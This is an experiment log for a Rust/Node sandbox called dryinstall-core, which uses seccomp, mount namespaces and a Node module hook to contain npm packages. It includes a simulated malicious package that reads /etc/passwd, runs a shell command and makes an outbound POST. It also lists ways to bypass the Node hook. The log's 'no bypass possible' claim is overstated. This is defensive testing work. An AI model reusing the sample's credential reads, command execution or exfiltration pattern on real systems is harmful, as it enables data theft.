# dryinstall-core — Rust Sandbox Experiment

> Reproducible experiment log. Anyone on the team can follow this step-by-step.

---

## Environment

| Item | Version |
|------|---------|
| OS | Ubuntu 24.04 LTS (VirtualBox 7.2.6) |
| Node.js | v20.20.1 |
| Rust | 1.94.0 |
| Cargo | 1.94.0 |
| libseccomp | 2.5.5 |

---

## Setup (Reproduce from scratch)

### 1. VirtualBox + Ubuntu
```
1. https://www.virtualbox.org → Download Windows host → Install
2. https://ubuntu.com/download/desktop → Ubuntu 24.04 LTS ISO
3. VirtualBox → New VM
   - Name: ubuntu-dryinstall
   - Memory: 4096MB
   - Disk: 25GB
   - ISO: Ubuntu 24.04
4. Complete Ubuntu installation
```

### 2. Install base tools
```bash
sudo apt update
sudo apt install -y git curl build-essential
```

### 3. Install Node.js
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
node --version  # v20.20.1
```

### 4. Install Rust
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
rustc --version  # rustc 1.94.0
cargo --version  # cargo 1.94.0
```

### 5. Install libseccomp
```bash
sudo apt install -y libseccomp-dev
```

### 6. Clone dryinstall
```bash
git clone https://github.com/MinSeok-log/dryinstall.git
cd dryinstall
npm install
```

### 7. Create Rust project
```bash
cd ~/dryinstall
cargo new dryinstall-core
cd dryinstall-core
```

### 8. Configure Cargo.toml
```bash
cat > Cargo.toml << 'EOF'
[package]
name = "dryinstall-core"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
seccomp = "0.1.2"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
libc = "0.2"
napi = { version = "2", features = ["napi4"] }
napi-derive = "2"

[build-dependencies]
napi-build = "2"
EOF
```

### 9. Verify build
```bash
cargo build
# Finished dev profile → success
```

---

## Experiment 1 — Malicious package runs freely (no sandbox)

### Goal
Verify that a malicious npm package can steal data and execute commands without any sandbox.

### Malicious package
```bash
mkdir ~/dryinstall/test-malicious
cd ~/dryinstall/test-malicious

cat > index.js << 'EOF'
const http = require('http');
const os = require('os');
const fs = require('fs');
const { execSync } = require('child_process');

function stealFiles() {
  try {
    const passwd = fs.readFileSync('/etc/passwd', 'utf8');
    console.log('[malicious] ✗ /etc/passwd READ SUCCESS');
    console.log('[malicious] first line:', passwd.split('\n')[0]);
  } catch(e) {
    console.log('[malicious] ✓ /etc/passwd BLOCKED:', e.message);
  }
}

function runCommand() {
  try {
    const result = execSync('whoami').toString().trim();
    console.log('[malicious] ✗ child_process SUCCESS:', result);
  } catch(e) {
    console.log('[malicious] ✓ child_process BLOCKED:', e.message);
  }
}

function stealData() {
  const req = http.request({
    hostname: '1.1.1.1', port: 80, path: '/', method: 'POST',
  }, (res) => {
    console.log('[malicious] ✗ Network data sent — NOT blocked');
  });
  req.on('error', (e) => {
    console.log('[malicious] ✓ Network BLOCKED:', e.message);
  });
  req.end();
}

console.log('[malicious] Package loaded');
stealFiles();
runCommand();
stealData();
EOF
```

### Run
```bash
node index.js
```

### Result
```
[malicious] Package loaded
[malicious] ✗ /etc/passwd READ SUCCESS
[malicious] first line: root:x:0:0:root:/root:/bin/bash
[malicious] ✗ child_process SUCCESS: vboxuser
[malicious] ✗ Network data sent — NOT blocked
```

### Conclusion
```
No sandbox → all attacks succeed
  /etc/passwd: readable (system credentials exposed)
  child_process: executable (arbitrary commands)
  Network: open (data exfiltration possible)
```

---

## Experiment 2 — Network blocked via Rust seccomp

### Goal
Block network syscalls at the OS kernel level using Rust seccomp.

### src/main.rs
```rust
extern crate seccomp;
extern crate libc;
use seccomp::*;
use std::process::Command;
use std::os::unix::process::CommandExt;

fn main() {
    let mut cmd = Command::new("node");
    cmd.arg("/home/vboxuser/dryinstall/test-malicious/index.js");

    unsafe {
        cmd.pre_exec(|| {
            let mut ctx = Context::default(Action::Allow).unwrap();
            let rule_net = Rule::new(
                42, // connect syscall
                Compare::arg(0).with(0).using(Op::Ge).build().unwrap(),
                Action::Errno(libc::EPERM),
            );
            ctx.add_rule(rule_net).unwrap();
            ctx.load().unwrap();
            Ok(())
        });
    }

    let output = cmd.output().unwrap();
    println!("{}", String::from_utf8_lossy(&output.stdout));
}
```

### Result
```
[malicious] ✓ Network BLOCKED: connect EPERM 1.1.1.1:80
```

### Conclusion
```
seccomp filter loaded via pre_exec
connect() syscall blocked at OS kernel level
→ No bypass possible (unlike Node.js vm)
```

---

## Experiment 3 — Filesystem isolation via Linux namespace

### Goal
Replace /etc/passwd with /dev/null inside an isolated mount namespace.

### run-sandbox.sh
```bash
#!/bin/bash
unshare --mount --pid --fork bash -c "
  mount --bind /dev/null /etc/passwd &&
  mount --bind /dev/null /etc/shadow &&
  /home/vboxuser/dryinstall/dryinstall-core/target/debug/dryinstall-core
"
```

### Result
```
[malicious] first line:   ← empty (blocked)
[malicious] ✓ Network BLOCKED: connect EPERM
```

### Conclusion
```
namespace: /etc/passwd content replaced with empty file
seccomp: network call blocked
Both applied simultaneously → success
```

---

## Experiment 4 — child_process blocked via Node hook

### Goal
Block child_process module without breaking Node.js runtime.

### block-child.js
```javascript
const Module = require('module');
const orig = Module._load;
Module._load = function(request, ...args) {
  if (request === 'child_process') {
    console.log('[sandbox] ✓ child_process BLOCKED');
    return {
      execSync:  () => { throw new Error('BLOCKED'); },
      exec:      () => { throw new Error('BLOCKED'); },
      spawn:     () => { throw new Error('BLOCKED'); },
      spawnSync: () => { throw new Error('BLOCKED'); },
    };
  }
  return orig.call(this, request, ...args);
};
```

### Note on security
```
Node hook alone can be bypassed via:
  process.binding('spawn_sync')
  native addons
  internal Node.js APIs

This is why all three layers are combined:
  Node hook + seccomp + namespace
  → Each layer covers the previous layer's blind spots
```

---

## Experiment 5 — CLI options: dynamic sandbox control

### Goal
Allow users to selectively enable sandbox layers via CLI flags.

### Usage
```bash
dryinstall-core [-n] [-f] [-e] <command> [args]
  -n  block network (seccomp connect syscall)
  -f  block filesystem (namespace /etc/passwd)
  -e  filter environment variables
```

### Full sandbox result
```bash
sudo ./dryinstall-core -n -f -e node malicious.js
```
```
[dryinstall-core] -n network: BLOCKED
[dryinstall-core] -f filesystem: BLOCKED
[dryinstall-core] -e env vars: FILTERED
---
[sandbox] ✓ child_process BLOCKED
[malicious] first line:                        ← empty
[malicious] ✓ child_process BLOCKED: BLOCKED
[malicious] ✓ Network BLOCKED: connect EPERM
```

---

## Experiment 6 — N-API Bridge: Node.js calls Rust

### Goal
Call the Rust sandbox engine directly from Node.js via N-API.

### src/lib.rs
```rust
use napi_derive::napi;
use std::process::Command;

#[napi]
pub fn sandbox_run(
    command: String,
    args: Vec<String>,
    block_network: bool,
    block_files: bool,
    filter_env: bool,
) -> String {
    let binary = "/home/vboxuser/dryinstall/dryinstall-core/target/release/dryinstall-core";
    let mut flags: Vec<&str> = vec![];
    if block_network { flags.push("-n"); }
    if block_files   { flags.push("-f"); }
    if filter_env    { flags.push("-e"); }

    let output = Command::new(binary)
        .args(&flags).arg(&command).args(&args)
        .output().unwrap();

    String::from_utf8_lossy(&output.stdout).to_string()
}
```

### Build
```bash
cargo build --release
napi build --platform --release
```

### test-napi.js
```javascript
const { sandboxRun } = require('./dryinstall-core.linux-x64-gnu.node');

const result = sandboxRun(
  'node',
  ['/home/vboxuser/dryinstall/test-malicious/index.js'],
  true,   // -n block network
  false,  // -f block filesystem
  false   // -e filter env
);
console.log(result);
```

### Result
```
[dryinstall-core] sandbox: -n=true -f=false -e=false
[dryinstall-core] -n network: BLOCKED
---
[sandbox] ✓ child_process BLOCKED
[malicious] first line: root:x:0:0:root:/root:/bin/bash
[malicious] ✓ child_process BLOCKED: BLOCKED
[malicious] ✓ Network BLOCKED: connect EPERM 1.1.1.1:80
---
[dryinstall-core] Done
```

### Conclusion
```
Node.js → Rust function call via N-API → success
sandboxRun() one-liner from dryinstall Node.js
```

---

## Final Comparison

| Attack | No sandbox | Rust sandbox |
|--------|-----------|-------------|
| Read /etc/passwd | ✗ Success (root:x:0:0...) | ✓ Blocked (empty) |
| child_process exec | ✗ Success (vboxuser) | ✓ BLOCKED |
| Network exfiltration | ✗ Success | ✓ EPERM (kernel) |
| Sandbox level | — | OS kernel |
| Bypass possible | Yes | No |

---

## Final Architecture

```
dryinstall (Node.js)
  → require('dryinstall-core.node')    ← N-API bridge
  → sandboxRun(cmd, args, -n, -f, -e)  ← Rust function
      ↓
  dryinstall-core (Rust binary)
      ↓
  Layer 1: Node hook (block-child.js)  ← child_process blocked
  Layer 2: seccomp (-n)                ← network syscall blocked
  Layer 3: namespace (-f)              ← filesystem isolated
  Layer 4: env_clear (-e)              ← env vars filtered
      ↓
  node package.js
```

---

## References

- seccomp crate: https://crates.io/crates/seccomp
- libseccomp: https://github.com/seccomp/libseccomp
- napi-rs: https://napi.rs
- dryinstall: https://github.com/MinSeok-log/dryinstall
